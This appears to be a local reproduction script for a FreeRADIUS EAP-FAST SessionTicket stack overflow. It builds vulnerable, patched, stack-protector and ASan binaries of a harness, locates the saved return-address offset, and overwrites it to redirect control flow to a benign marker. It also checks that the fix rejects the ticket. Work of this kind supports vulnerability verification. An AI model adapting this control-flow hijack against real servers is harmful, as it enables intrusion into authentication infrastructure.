#!/usr/bin/env bash
# Reproduce FreeRADIUS CVE-2026-127030 EAP-FAST SessionTicket stack overflow.
# Local files only; no listener and no off-loopback probe.
set -u
cd "$(dirname "$0")"
mkdir -p logs

CFLAGS="-O0 -g -fno-omit-frame-pointer -no-pie"
echo "[build] vulnerable / fixed / canary / asan"
gcc $CFLAGS -fno-stack-protector -Wall -o vuln   eap_fast_overflow.c -lcrypto 2>logs/build-vuln.err
gcc $CFLAGS -fno-stack-protector -DFIXED -Wall -o fixed  eap_fast_overflow.c -lcrypto 2>logs/build-fixed.err
gcc $CFLAGS -fstack-protector-all -Wall -o canary eap_fast_overflow.c -lcrypto 2>logs/build-canary.err
gcc $CFLAGS -fno-stack-protector -fsanitize=address -Wall -o asan eap_fast_overflow.c -lcrypto 2>logs/build-asan.err

echo "[probe] locate saved-RIP slot relative to the 152-byte stack destination"
./vuln probe 2>&1 | tee logs/probe.out
OFF=$(sed -n 's/.*offset=\([0-9]*\).*/\1/p' logs/probe.out | head -1)
echo "offset=$OFF"

echo "[rung 2/3] chosen 0x4242... written at the saved-RIP slot"
./vuln "$OFF" state logs/state-ticket.bin >logs/state.out 2>&1
STATE_RC=$?
cat logs/state.out
echo "state_rc=$STATE_RC"

echo "[rung 4] chosen address at the saved-RIP slot executes a benign marker"
./vuln "$OFF" flow logs/flow-ticket.bin >logs/flow.out 2>&1
FLOW_RC=$?
cat logs/flow.out
echo "flow_rc=$FLOW_RC"

echo "[differential] upstream fix 064567a0 rejects the same ticket"
./fixed "$OFF" flow logs/flow-ticket.bin >logs/fixed.out 2>&1
FIXED_RC=$?
cat logs/fixed.out
echo "fixed_rc=$FIXED_RC"

echo "[detector] gcc stack protector on a small over-write"
./canary "$OFF" flow >logs/canary.out 2>&1
CANARY_RC=$?
cat logs/canary.out
echo "canary_rc=$CANARY_RC"

echo "[detector] ASan on the same ticket (may be blind: write is inside libcrypto)"
ASAN_OPTIONS=detect_leaks=0 ./asan "$OFF" flow >logs/asan.out 2>&1
ASAN_RC=$?
cat logs/asan.out
echo "asan_rc=$ASAN_RC"

echo "[digests]"
sha256sum eap_fast_overflow.c run.sh logs/state-ticket.bin logs/flow-ticket.bin | tee logs/digests.txt

echo "[verdict]"
pass=1
grep -q 'now=0x4242424242424242' logs/state.out || { echo "FAIL: chosen value absent"; pass=0; }
grep -q 'MARKER: chosen control-flow target executed' logs/flow.out || { echo "FAIL: marker not executed"; pass=0; }
[ "$FLOW_RC" -eq 42 ] || { echo "FAIL: flow rc $FLOW_RC"; pass=0; }
grep -q 'FIXED: reject PAC is too long' logs/fixed.out || { echo "FAIL: fixed build did not reject"; pass=0; }
[ "$FIXED_RC" -eq 0 ] || { echo "FAIL: fixed rc $FIXED_RC"; pass=0; }
if [ "$pass" -eq 1 ]; then echo "ALL CHECKS PASS"; else echo "CHECKS FAILED"; fi
